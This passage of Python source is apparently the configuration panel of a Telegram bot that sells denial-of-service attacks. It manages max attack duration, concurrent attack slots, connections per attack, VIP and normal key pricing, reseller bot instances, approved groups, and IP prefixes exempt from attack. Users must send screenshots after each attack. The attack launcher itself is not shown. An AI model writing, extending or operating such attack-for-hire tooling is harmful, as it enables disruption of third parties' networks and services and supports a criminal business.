            f"{HTML_EMOJI.CAMERA} <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝</b>\n\n𝐂𝐮𝐫𝐫𝐞𝐧𝐭: {'🟢 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃' if current else '🔴 𝐍𝐎𝐓 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃'}\n\n𝐖𝐡𝐞𝐧 𝐞𝐧𝐚𝐛𝐥𝐞𝐝, 𝐮𝐬𝐞𝐫𝐬 𝐦𝐮𝐬𝐭 𝐬𝐞𝐧𝐝 𝐚 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭 𝐚𝐟𝐭𝐞𝐫 𝐞𝐚𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )

    elif data == "config_view":
        busy_slots, free_slots, total_slots = get_slot_status()
        response = f"{HTML_EMOJI.STATS} <b>𝐂𝐔𝐑𝐑𝐄𝐍𝐓 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒</b>\n\n"
        response += f"{HTML_EMOJI.SETTINGS} 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞: {get_max_attack_time()}s\n"
        response += f"{HTML_EMOJI.TIMER} 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {get_user_cooldown_setting()}s\n"
        response += f"{HTML_EMOJI.TARGET} 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬: {total_slots} (𝐅𝐫𝐞𝐞: {free_slots})\n"
        response += f"{HTML_EMOJI.FIRE} 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐏𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤: {get_concurrent_limit()}\n"
        response += f"{HTML_EMOJI.LOCK} 𝐏𝐨𝐫𝐭 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧: {'𝐎𝐍' if get_setting('port_protection', True) else '𝐎𝐅𝐅'}\n"
        response += f"{HTML_EMOJI.CAMERA} 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝: {'𝐎𝐍' if get_setting('feedback_required', True) else '𝐎𝐅𝐅'}\n"
        response += f"{HTML_EMOJI.SETTINGS} 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞: {'𝐎𝐍' if is_maintenance() else '𝐎𝐅𝐅'}\n"
        response += f"{HTML_EMOJI.BAN} 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐈𝐏𝐬: {len(get_all_blocked_ips())}\n"
        response += f"{HTML_EMOJI.USERS} 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐆𝐫𝐨𝐮𝐩𝐬: {approved_groups_collection.count_documents({})}\n"
        response += f"{HTML_EMOJI.DISCORD} 𝐀𝐜𝐭𝐢𝐯𝐞 𝐁𝐨𝐭𝐬: {len([b for b in get_all_bots() if b.get('active')])}\n"
        response += f"\n{HTML_EMOJI.STAR} 𝐕𝐈𝐏 𝐌𝐀𝐗 𝐀𝐓𝐓𝐀𝐂𝐊: {get_key_max_attack('VIP')}s\n"
        response += f"{HTML_EMOJI.DOCUMENT} 𝐍𝐎𝐑𝐌𝐀𝐋 𝐌𝐀𝐗 𝐀𝐓𝐓𝐀𝐂𝐊: {get_key_max_attack('NORMAL')}s\n"

        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif data == "config_back":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⚙️ 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞", callback_data="config_maxtime"),
            InlineKeyboardButton("⏳ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧", callback_data="config_cooldown"),
            InlineKeyboardButton("🎯 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬", callback_data="config_slots"),
            InlineKeyboardButton("⚡ 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭/𝐀𝐭𝐭𝐚𝐜𝐤", callback_data="config_concurrent"),
            InlineKeyboardButton("🚫 𝐁𝐥𝐨𝐜𝐤 𝐈𝐏", callback_data="config_blockip"),
            InlineKeyboardButton("✅ 𝐔𝐧𝐛𝐥𝐨𝐜𝐤 𝐈𝐏", callback_data="config_unblockip"),
            InlineKeyboardButton("📋 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐈𝐏𝐬", callback_data="config_listip"),
            InlineKeyboardButton("🔒 𝐏𝐨𝐫𝐭 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧", callback_data="config_portprotect"),
            InlineKeyboardButton("📸 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝", callback_data="config_feedback"),
            InlineKeyboardButton("💰 𝐕𝐈𝐏 𝐏𝐫𝐢𝐜𝐢𝐧𝐠", callback_data="config_vip_price"),
            InlineKeyboardButton("💰 𝐍𝐎𝐑𝐌𝐀𝐋 𝐏𝐫𝐢𝐜𝐢𝐧𝐠", callback_data="config_normal_price"),
            InlineKeyboardButton("👥 𝐆𝐫𝐨𝐮𝐩 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬", callback_data="config_group"),
            InlineKeyboardButton("🤖 𝐁𝐨𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬", callback_data="config_bot"),
            InlineKeyboardButton("🔧 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞", callback_data="config_maintenance"),
            InlineKeyboardButton("📊 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬", callback_data="config_view")
        )
        bot.edit_message_text(
            f"{HTML_EMOJI.SETTINGS} <b>𝐂𝐎𝐍𝐅𝐈𝐆𝐔𝐑𝐀𝐓𝐈𝐎𝐍 𝐏𝐀𝐍𝐄𝐋</b>\n\n𝐒𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 𝐭𝐨 𝐜𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐞:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="HTML"
        )


@bot.callback_query_handler(func=lambda call: call.data in ["portprotect_on", "portprotect_off", "feedback_on", "feedback_off", "maint_on", "maint_off", "group_add", "group_remove", "group_list", "bot_add", "bot_remove", "bot_list"])
def action_callbacks(call):
    # ZAROORI FIX: Answer query immediately
    bot.answer_callback_query(call.id)

    user_id = call.from_user.id

    if not is_owner(user_id):
        bot.send_message(call.message.chat.id, f"{HTML_EMOJI.CROSS} <b>Only owner can do this!</b>", parse_mode="HTML")
        return

    if call.data == "portprotect_on":
        set_setting('port_protection', True)
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝐏𝐨𝐫𝐭 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐄𝐍𝐀𝐁𝐋𝐄𝐃!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif call.data == "portprotect_off":
        set_setting('port_protection', False)
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝐏𝐨𝐫𝐭 𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif call.data == "feedback_on":
        set_setting('feedback_required', True)
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐄𝐍𝐀𝐁𝐋𝐄𝐃!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif call.data == "feedback_off":
        set_setting('feedback_required', False)
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif call.data == "maint_on":
        set_maintenance(True, "Bot is under maintenance. Please try again later.")
        bot.edit_message_text(f"{HTML_EMOJI.SETTINGS} <b>𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐌𝐨𝐝𝐞 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐄𝐍𝐀𝐁𝐋𝐄𝐃!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif call.data == "maint_off":
        set_maintenance(False)
        bot.edit_message_text(f"{HTML_EMOJI.CHECKMARK} <b>𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐌𝐨𝐝𝐞 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃!</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif call.data == "group_add":
        bot.edit_message_text(
            f"{HTML_EMOJI.ARROW_RIGHT} <b>𝐀𝐝𝐝 𝐆𝐫𝐨𝐮𝐩</b>\n\n𝐒𝐞𝐧𝐝: <code>/addgrp &lt;name&gt; &lt;group_id&gt; &lt;days&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/addgrp TESTGROUP -100123456789 30</code>\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )

    elif call.data == "group_remove":
        bot.edit_message_text(
            f"{HTML_EMOJI.CROSS} <b>𝐑𝐞𝐦𝐨𝐯𝐞 𝐆𝐫𝐨𝐮𝐩</b>\n\n𝐒𝐞𝐧𝐝: <code>/delgrp &lt;name&gt;</code>\n\n𝐔𝐬𝐞 /grpinfo 𝐭𝐨 𝐬𝐞𝐞 𝐠𝐫𝐨𝐮𝐩 𝐧𝐚𝐦𝐞𝐬.\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )

    elif call.data == "group_list":
        groups = list(approved_groups_collection.find())
        if not groups:
            response = f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐠𝐫𝐨𝐮𝐩𝐬 𝐟𝐨𝐮𝐧𝐝!"
        else:
            response = f"{HTML_EMOJI.USERS} <b>𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐆𝐑𝐎𝐔𝐏𝐒</b>\n\n"
            for i, group in enumerate(groups, 1):
                status = f"{HTML_EMOJI.CHECKMARK} 𝐀𝐜𝐭𝐢𝐯𝐞" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else f"{HTML_EMOJI.CROSS} 𝐄𝐱𝐩𝐢𝐫𝐞𝐝"
                response += f"{i}. <b>{group.get('name', 'Unknown')}</b>\n"
                response += f"   {HTML_EMOJI.PROFILE} 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃: <code>{group['group_id']}</code>\n"
                response += f"   {HTML_EMOJI.STATS} 𝐒𝐭𝐚𝐭𝐮𝐬: {status}\n"
                response += f"   {HTML_EMOJI.SETTINGS} 𝐌𝐚𝐱 𝐓𝐢𝐦𝐞: {group.get('max_attack_time', get_max_attack_time())}s\n"
                response += f"   {HTML_EMOJI.TARGET} 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬: {group.get('max_slots', current_max_slots)}\n"
                response += f"   {HTML_EMOJI.TIMER} 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {group.get('cooldown', get_user_cooldown_setting())}s\n"
                response += f"   {HTML_EMOJI.CAMERA} 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝: {'𝐎𝐍' if group.get('feedback_required', get_setting('feedback_required', True)) else '𝐎𝐅𝐅'}\n"
                if group.get('expiry_date'):
                    response += f"   {HTML_EMOJI.CALENDAR} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
                response += "\n"
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif call.data == "bot_add":
        bot.edit_message_text(
            f"{HTML_EMOJI.ARROW_RIGHT} <b>𝐀𝐝𝐝 𝐁𝐨𝐭</b>\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨𝐤𝐞𝐧:\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, get_bot_token)

    elif call.data == "bot_remove":
        bots = get_all_bots()
        if not bots:
            bot.edit_message_text(f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐟𝐨𝐮𝐧𝐝!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        else:
            bot_list = f"{HTML_EMOJI.DISCORD} <b>𝐀𝐜𝐭𝐢𝐯𝐞 𝐁𝐨𝐭𝐬:</b>\n\n"
            for b in bots:
                bot_list += f"• 𝐈𝐃: <code>{b['bot_id']}</code> | 𝐀𝐜𝐭𝐢𝐯𝐞: {'✅' if b.get('active') else '❌'}\n"
            bot_list += "\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐁𝐨𝐭 𝐈𝐃 𝐨𝐫 𝐓𝐨𝐤𝐞𝐧 𝐭𝐨 𝐝𝐞𝐥𝐞𝐭𝐞:\n𝐓𝐲𝐩𝐞 /cancel 𝐭𝐨 𝐚𝐛𝐨𝐫𝐭."
            bot.edit_message_text(bot_list, call.message.chat.id, call.message.message_id, parse_mode="HTML")
            bot.register_next_step_handler(call.message, process_del_bot)

    elif call.data == "bot_list":
        bots = get_all_bots()
        if not bots:
            response = f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐟𝐨𝐮𝐧𝐝!"
        else:
            response = f"{HTML_EMOJI.DISCORD} <b>𝐀𝐋𝐋 𝐁𝐎𝐓𝐒</b>\n\n"
            for b in bots:
                status = f"{HTML_EMOJI.CHECKMARK} 𝐑𝐮𝐧𝐧𝐢𝐧𝐠" if b.get('active') else f"{HTML_EMOJI.CROSS} 𝐒𝐭𝐨𝐩𝐩𝐞𝐝"
                response += f"<b>𝐁𝐨𝐭 𝐈𝐃:</b> <code>{b['bot_id']}</code>\n"
                response += f"<b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status}\n"
                response += f"<b>𝐎𝐰𝐧𝐞𝐫:</b> {b['owner_id']}\n"
                response += f"<b>𝐒𝐥𝐨𝐭𝐬:</b> {b.get('max_slots', 1)}\n"
                response += "──────────────────\n"
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")


def set_max_time_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        value = int(message.text.strip())
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐕𝐚𝐥𝐮𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐭 𝐥𝐞𝐚𝐬𝐭 {MIN_ATTACK_TIME} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_setting('max_attack_time', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 𝐬𝐞𝐭 𝐭𝐨 {value} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def set_cooldown_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        value = int(message.text.strip())
        if value < 0:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐧𝐞𝐠𝐚𝐭𝐢𝐯𝐞!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_setting('user_cooldown', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐬𝐞𝐭 𝐭𝐨 {value} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def set_slots_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        global current_max_slots
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        current_max_slots = value
        set_setting('max_concurrent_slots', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐌𝐚𝐱 𝐬𝐥𝐨𝐭𝐬 𝐬𝐞𝐭 𝐭𝐨 {value}!</b>\n\n𝐍𝐨𝐰 {value} 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐜𝐚𝐧 𝐫𝐮𝐧 𝐬𝐢𝐦𝐮𝐥𝐭𝐚𝐧𝐞𝐨𝐮𝐬𝐥𝐲.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def set_concurrent_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        set_concurrent_limit(value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐩𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐞𝐭 𝐭𝐨 {value}!</b>\n\n𝐄𝐚𝐜𝐡 𝐀𝐏𝐈 𝐜𝐚𝐥𝐥 𝐰𝐢𝐥𝐥 𝐮𝐬𝐞 {value} 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def block_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    ip_prefix = message.text.strip()

    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 <code>{ip_prefix}*</code> 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>\n\n𝐀𝐧𝐲 𝐈𝐏 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 {ip_prefix} 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐚𝐭𝐭𝐚𝐜𝐤𝐞𝐝.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐛𝐥𝐨𝐜𝐤 𝐈𝐏!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def unblock_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    ip_prefix = message.text.strip()

    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 <code>{ip_prefix}*</code> 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐮𝐧𝐛𝐥𝐨𝐜𝐤𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐏 𝐩𝐫𝐞𝐟𝐢𝐱 <code>{ip_prefix}*</code> 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐛𝐥𝐨𝐜𝐤𝐞𝐝 𝐥𝐢𝐬𝐭!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def get_bot_token(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐜𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    bot_token = message.text.strip()

    if ":" in bot_token:
        try:
            test_bot = telebot.TeleBot(bot_token)
            bot_info = test_bot.get_me()
            bot_id = bot_info.id

            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐁𝐨𝐭 𝐢𝐝𝐞𝐧𝐭𝐢𝐟𝐢𝐞𝐝:</b> <b>{bot_info.first_name}</b> (@{bot_info.username})\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 <b>𝐀𝐝𝐦𝐢𝐧/𝐎𝐰𝐧𝐞𝐫 𝐈𝐃</b> 𝐟𝐨𝐫 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭:", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            bot.register_next_step_handler(message, lambda m: get_bot_admin(m, bot_token, bot_id))
        except Exception as e:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐨𝐤𝐞𝐧!</b> 𝐄𝐫𝐫𝐨𝐫: {str(e)}\n\n𝐔𝐬𝐞 /addbot 𝐭𝐨 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐨𝐤𝐞𝐧 𝐟𝐨𝐫𝐦𝐚𝐭!</b>\n\n𝐔𝐬𝐞 /addbot 𝐭𝐨 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def get_bot_admin(message, bot_token, bot_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐜𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        admin_id = int(message.text.strip())

        bot.reply_to(message, f"{HTML_EMOJI.SETTINGS} <b>𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬</b>\n\n𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐜𝐚𝐧 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭 𝐡𝐚𝐧𝐝𝐥𝐞?\n\n𝐒𝐞𝐧𝐝 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫 (1-10):", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        bot.register_next_step_handler(message, lambda m: get_bot_slots(m, bot_token, bot_id, admin_id))
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐃!</b> 𝐒𝐞𝐧𝐝 𝐚 𝐧𝐮𝐦𝐞𝐫𝐢𝐜 𝐈𝐃.\n\n𝐔𝐬𝐞 /addbot 𝐭𝐨 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def get_bot_slots(message, bot_token, bot_id, admin_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐜𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    try:
        max_slots = int(message.text.strip())
        if max_slots < 1:
            max_slots = 1
        if max_slots > 10:
            max_slots = 10

        success, result = add_bot(bot_token, admin_id, max_slots)

        if success:
            bot_config = get_bot_config(bot_token)
            if bot_config:
                start_bot_instance(bot_config)

            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐁𝐨𝐭 𝐀𝐝𝐝𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!</b>\n\n{HTML_EMOJI.DISCORD} 𝐁𝐨𝐭 𝐈𝐃: <code>{result}</code>\n{HTML_EMOJI.STAR} 𝐎𝐰𝐧𝐞𝐫 𝐈𝐃: {admin_id}\n{HTML_EMOJI.SETTINGS} 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬: {max_slots}\n\n𝐁𝐨𝐭 𝐢𝐬 𝐧𝐨𝐰 𝐫𝐮𝐧𝐧𝐢𝐧𝐠!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        else:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐚𝐝𝐝 𝐛𝐨𝐭:</b> {result}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b>\n\n𝐔𝐬𝐞 /addbot 𝐭𝐨 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


def process_del_bot(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐜𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    bot_input = message.text.strip()
    success, result = delete_bot(bot_input)

    if success:
